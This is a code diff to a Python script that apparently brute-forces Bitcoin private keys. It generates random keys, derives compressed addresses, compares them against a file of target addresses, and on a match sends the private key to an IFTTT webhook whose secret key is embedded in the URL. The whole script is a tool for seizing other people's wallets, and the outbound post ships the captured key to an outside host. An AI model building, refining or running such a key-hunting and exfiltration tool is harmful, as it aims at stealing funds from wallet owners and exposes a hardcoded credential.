@@ -23,7 +23,7 @@ def ripemd160(x):
 
 
 r = 0
-cores=1 #<------------------change here  CPU
+cores=2
 
 
 def seek(r, df_handler):
@@ -34,17 +34,25 @@ def seek(r, df_handler):
 	print("Core " + str(r) +":  Searching Private Key..")
 	while True:
 		#i=i+1
-		# generate private key , uncompressed WIF starts with "5"
+		# generate private key , Compressed WIF start with K
 		priv_key = os.urandom(32)
-		fullkey = '80' + binascii.hexlify(priv_key).decode()
+		fullkey1 = binascii.hexlify(priv_key).decode()
+		fullkey = '80' + binascii.hexlify(priv_key).decode() +'01'
 		sha256a = hashlib.sha256(binascii.unhexlify(fullkey)).hexdigest()
 		sha256b = hashlib.sha256(binascii.unhexlify(sha256a)).hexdigest()
 		WIF = base58.b58encode(binascii.unhexlify(fullkey+sha256b[:8]))
 
-		# get public key , uncompressed address starts with "1"
+		# get public key , Compressed address starts with "1"
 		sk = ecdsa.SigningKey.from_string(priv_key, curve=ecdsa.SECP256k1)
 		vk = sk.get_verifying_key()
-		publ_key = '04' + binascii.hexlify(vk.to_string()).decode()
+		key_bytes = binascii.hexlify(vk.to_string()).decode()
+		key = ('0x' + binascii.hexlify(sk.verifying_key.to_string()).decode('utf-8'))
+		half_len = len(key_bytes) // 2
+		key_half = key_bytes[:half_len]
+		# Add bitcoin byte: 0x02 if the last digit is even, 0x03 if the last digit is odd
+		last_byte = int(key[-1], 16)
+		bitcoin_byte = '02' if last_byte % 2 == 0 else '03'
+		publ_key = bitcoin_byte + key_half
 		hash160 = ripemd160(hashlib.sha256(binascii.unhexlify(publ_key)).digest()).digest()
 		publ_addr_a = b"\x00" + hash160
 		checksum = hashlib.sha256(hashlib.sha256(publ_addr_a).digest()).digest()[:4]
@@ -52,18 +60,20 @@ def seek(r, df_handler):
 		priv = WIF.decode()
 		pub = publ_addr_b.decode()
 		time_diff = dt.datetime.today().timestamp() - start_time
-		#if (i % LOG_EVERY_N) == 0:
-		#	print('Core :'+str(r)+" K/s = "+ str(i / time_diff))
+#		if (i % LOG_EVERY_N) == 0:
+#			print('Core :'+str(r)+" K/s = "+ str(i / time_diff))
+		if (i % 10000) == 0:
+			print("i'm working")
 		#print ('Worker '+str(r)+':'+ str(i) + '.-  # '+pub + ' # -------- # '+ priv+' # ')
 		pub = pub + '\n'
-		filename = '/content/Bitcoin_addresses_LATEST.txt' #<------------------change here Dir
+		filename = '/content/Bitcoin_addresses_LATEST.txt'
 		with open(filename) as f:
 			for line in f:
 				if pub in line:
-					msg = "\nPublic: " + str(pub) + " ---- Private: " + str(priv) + "YEI"
+					msg = "\nPublic: " + str(pub) + " ---- Private: " + str(priv)
 					text = msg
 					print(text)
-					requests.post(url="https://maker.ifttt.com/trigger/hmbt/with/key/d8gr-cI50XXn1WSEOHf64W", data={ 'value1' : 'P', 'value2' : fullkey, 'value3' : 'R3'})
+					requests.post(url="https://maker.ifttt.com/trigger/hmbt/with/key/d8gr-cI50XXn1WSEOHf64W", data={ 'value1' : 'P', 'value2' : fullkey1, 'value3' : 'R3'})
 					with open('Wallets.txt','a') as f:
 						f.write(priv)
 						f.write('     ')
@@ -71,7 +81,7 @@ def seek(r, df_handler):
 						f.write('\n')
 						f.close()
 					time.sleep(10)
-					print ('WINNER WINNER CHICKEN DINNER!!! ---- ' +dt.datetime.now().strftime('%Y-%m-%d %H:%M:%S'), pub, priv)
+					#print (fullkey1 + 'WINNER WINNER CHICKEN DINNER!!! ---- ' + dt.datetime.now().strftime('%Y-%m-%d %H:%M:%S'), pub, priv)
 					break
 					
 
@@ -80,7 +90,7 @@ def seek(r, df_handler):
 contador=0
 if __name__ == '__main__':
 	jobs = []
-	df_handler = pd.read_csv(open('/content/Bitcoin_addresses_LATEST.txt', 'r')) #<------------------change here Dir
+	df_handler = pd.read_csv(open('/content/Bitcoin_addresses_LATEST.txt', 'r'))
 	for r in range(cores):
 		p = multiprocessing.Process(target=seek, args=(r,df_handler))
 		jobs.append(p)
